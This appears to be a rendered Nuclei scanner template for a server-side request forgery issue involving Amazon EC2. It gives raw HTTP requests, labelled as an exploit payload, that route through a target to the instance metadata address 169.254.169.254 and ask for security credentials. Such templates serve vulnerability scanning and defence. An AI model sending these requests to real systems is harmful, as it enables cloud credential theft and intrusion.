# Nuclei Template: Amazon EC2 - Server-side request forgery (SSRF)
**Template ID:** amazon-ec2-ssrf
**Vulnerability Class:** Server-Side Request Forgery (SSRF)
**Severity:** Critical
**CWE:** CWE-441
**Source:** Nuclei Template (`amazon-ec2-ssrf.yaml`)

## Vulnerability Information & PoC

## Description
SSRF vulnerability exists in Amazon EC2, or Amazon Elastic Compute Cloud which is a web service provided by Amazon Web Services (AWS) that offers resizable compute capacity in the cloud.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance HTTP/1.1
Host: {{Hostname}}

@tls-sni: {{Hostname}}
GET http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance HTTP/1.1
Host: {{Hostname}}
```

